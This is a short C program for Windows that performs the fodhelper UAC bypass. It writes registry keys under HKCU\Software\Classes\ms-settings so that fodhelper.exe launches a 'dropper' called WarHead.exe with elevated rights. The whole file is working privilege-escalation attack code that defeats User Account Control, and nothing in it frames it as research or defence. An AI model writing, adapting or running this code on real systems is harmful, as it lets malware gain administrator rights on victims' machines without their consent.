
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>

int main() {
    const char* dropperName = "WarHead.exe"; // must be in the same folder

    char exePath[MAX_PATH] = { 0 };
    if (!GetFullPathNameA(dropperName, MAX_PATH, exePath, NULL)) {
        printf("[!] Failed to resolve dropper path. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[*] Dropper path: %s\n", exePath);

    char regCmd1[MAX_PATH * 4];
    char regCmd2[MAX_PATH * 4];

    snprintf(regCmd1, sizeof(regCmd1),
        "REG ADD \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /f /ve /t REG_SZ /d \"\\\"%s\\\"\"",
        exePath);

    snprintf(regCmd2, sizeof(regCmd2),
        "REG ADD \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /f /v \"DelegateExecute\" /t REG_SZ /d \"\"");

    printf("[*] Setting registry keys for UAC bypass...\n");
    system(regCmd1);
    system(regCmd2);

    printf("[*] Preparing to launch fodhelper.exe using CreateProcess...\n");

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    PVOID oldValue = NULL;

    BOOL disableResult = Wow64DisableWow64FsRedirection(&oldValue);
    BOOL result = CreateProcessA(
        "C:\\Windows\\System32\\fodhelper.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );
    if (disableResult) {
        Wow64RevertWow64FsRedirection(oldValue);
    }

    if (!result) {
        printf("[!] Failed to launch fodhelper.exe. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[*] Successfully launched fodhelper.exe (PID: %lu). Waiting...\n", pi.dwProcessId);
    WaitForSingleObject(pi.hProcess, 5000);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("[+] Done. Dropper should have run elevated.\n");
    return 0;
}
